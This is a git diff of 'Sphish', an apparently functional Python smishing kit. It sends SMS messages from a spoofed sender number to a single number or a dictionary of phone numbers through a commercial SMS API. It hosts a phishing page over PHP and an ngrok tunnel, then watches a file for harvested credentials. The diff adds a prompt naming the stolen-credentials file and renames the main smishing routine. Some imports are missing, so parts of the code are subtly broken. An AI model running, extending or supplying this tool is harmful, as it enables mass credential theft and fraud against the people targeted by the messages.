@@ -1,15 +1,16 @@
 #!/usr/bin/python3
 
+from doctest import ELLIPSIS_MARKER
 from pwn import *
 from sys import exit
-from subprocess import getoutput, call
+from subprocess import getoutput, call, Popen
 from os import system, remove, getcwd, mkdir, chmod
 from colored import fg, attr
 from time import sleep
 from argparse import ArgumentParser
 from requests import post
 from wget import download
-from shutil import move, copy, rmtree
+from shutil import move, copy, rmtree, copyfile
 from requests import get
 import os
 from zipfile import ZipFile
@@ -20,7 +21,6 @@ parser = ArgumentParser()
 
 parser.add_argument('-c', '--check', help='check and install dependencies', action='store_true')
 parser.add_argument('-n', '--ngrok', help='Install and configure ngrok')
-parser.add_argument('-s', '--sms', help='config and send sms with API, set ID argument',)
 parser.add_argument('-a', '--all', help='Smishing with Ngrok')
 
 args = parser.parse_args()
@@ -37,14 +37,14 @@ class Sphish():
 		self.__id = id
 
 	def banner(self):
-			print(f"""%s
-			███████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
-			██╔════╝██╔══██╗██║  ██║██║██╔════╝██║  ██║
-			███████╗██████╔╝███████║██║███████╗███████║
-			╚════██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
-			███████║██║     ██║  ██║██║███████║██║  ██║
-			╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
-								Created by %sWackyH4cker""" % (fg('cyan'), fg('red')))
+		print(f"""%s
+		███████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
+		██╔════╝██╔══██╗██║  ██║██║██╔════╝██║  ██║
+		███████╗██████╔╝███████║██║███████╗███████║
+		╚════██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
+		███████║██║     ██║  ██║██║███████║██║  ██║
+		╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
+							Created by %sWackyH4cker""" % (fg('cyan'), fg('red')))
 
 	def dependencies(self):
 		self.banner()
@@ -64,7 +64,6 @@ class Sphish():
 			else:
 				p1.failure(self.__user+', use %sroot%s.' % (fg('green'), attr('reset')))
 				exit(1)
-
 
 	def ngrok_download(self):
 		self.dependencies()
@@ -93,6 +92,7 @@ class Sphish():
 			except Exception as e:
 				p1.failure(e)
 				exit(1)
+
 	def send_sms(self, addressee, spoof_number, message):
 
 		url = "https://us.sms.api.sinch.com/xms/v1/" + self.__id + "/batches"
@@ -123,6 +123,7 @@ class Sphish():
 		print('  %sNote: %sabsolute path in case of another path: [/home/user/dictionary.txt] or relative path in case of the same directory: [dictionary.txt].%s ' % (fg('red'), fg('white'), attr('reset')))
 		print('\n  \033[1mEnter the path of the number dictionary\n%s' % attr('reset'))	
 		dictionary = input('%s[%sPATH%s@%s%s%s]-[%s~%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), route, fg('red'), fg('yellow'), fg('red'), fg('white')))
+		
 		try:
 			with open(dictionary.rstrip(), "r") as numbers:
 				spoof_number = input('%s[%sFROM%s@%sexample.com%s]-[%s$%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), fg('red'), fg('yellow'), fg('red'), fg('white')))
@@ -137,7 +138,7 @@ class Sphish():
 				numbers.close()
 				p2.failure('%sFailed numbers saved in fail.txt file. Thanks for using Sphish%s\n' % (fg('white'), attr('reset')))
 				print('\n  \033[1m%s[%s*%s] %sWaiting for credentials%s\n' % (fg('red'), fg('yellow'), fg('red'), fg('green'), attr('reset')))
-				system('tail -F --retry .sites/usernames.txt 2>/dev/null')
+				system(f'tail -F --retry .sites/{name_file} > /dev/null 2>&1')
 				exit(0)
 		except OSError:
 			print("\n  %sDictionary path does not exist%s\n" % (fg('red'), attr('reset')))
@@ -158,12 +159,16 @@ class Sphish():
 		print()
 		p2.failure('%sFailed number saved in fail.txt file. Thanks for using Sphish%s\n' % (fg('white'), attr('reset')))
 		print('\n  \033[1m%s[%s*%s] %sWaiting for credentials%s\n' % (fg('red'), fg('yellow'), fg('red'), fg('green'), attr('reset')))
-		system('tail -F --retry .sites/usernames.txt 2>/dev/null')
+		Popen(["tail", "-F", "--retry", f".sites/{name_file}"], shell=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 		exit(0)
+	
 	def ngrok_template(self, route):
 		print('\n  \033[1mEnter template to use, must be a directory.\n%s' % attr('reset'))
 		template = input('%s[%sTEMPLATE%s@%s%s%s]-[%s$%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), route, fg('red'), fg('yellow'), fg('red'), fg('white')))
 		path = template.rstrip()
+		print('\n  \033[1mEnter the name of the file where the credentials are stored\n%s' % attr('reset'))
+		global name_file
+		name_file = input('%s[%sFILE_CREDENTIALS%s@%s%s%s]-[%s~%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), path, fg('red'), fg('yellow'), fg('red'), fg('white')))
 		
 		try:
 			mkdir(route+'/.sites')
@@ -185,7 +190,7 @@ class Sphish():
 				if os.path.isfile('.sites/ngrok'):
 					pass
 				else:
-					move(route+'/ngrok', route+'/.sites')
+					copyfile(route+'/ngrok', route+'/.sites/ngrok')
 			elif os.path.isfile('.sites/ngrok'):
 				pass
 			else:
@@ -201,19 +206,20 @@ class Sphish():
 			sleep(2)
 			try:
 				system(f'cd .sites && php -S 127.0.0.1:8080 > /dev/null 2>&1 &')
-				p1.success('http://127.0.0.1:8080')
+				p1.success(fg('sea_green_1b')+'http://127.0.0.1:8080'+attr('reset'))
 				with log.progress('Ngrok server') as p2:
+					chmod('.sites/ngrok', stat.S_IEXEC)
 					system(f'cd .sites && ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &')
 					sleep(2)
 					r = get('http://127.0.0.1:4040/api/tunnels')
 					json_data = r.json()
 					for i in json_data["tunnels"]:
 						url = i["public_url"]
-						p2.success(url)
+						p2.success(fg('sea_green_1b')+url+attr('reset'))
 			except:	
 				print("error")
 
-	def config_sms(self):
+	def all(self):
 		self.dependencies()
 		print('\n %s[%s1%s] %s\033[1mPhone number dictionary%s' % (fg('cyan'), fg('green'), fg('cyan'), fg('white'), attr('reset')))
 		print(' %s[%s2%s] %s\033[1mJust a number%s' % (fg('cyan'), fg('green'), fg('cyan'), fg('white'), attr('reset')))
@@ -253,8 +259,7 @@ def main():
 	elif args.ngrok:
 		sphish.ngrok_download()
 	elif args.all:
-		sphish.config_sms()
+		sphish.all()
 		
-		sphish.config_sms()
 if __name__ == '__main__':
 	main()
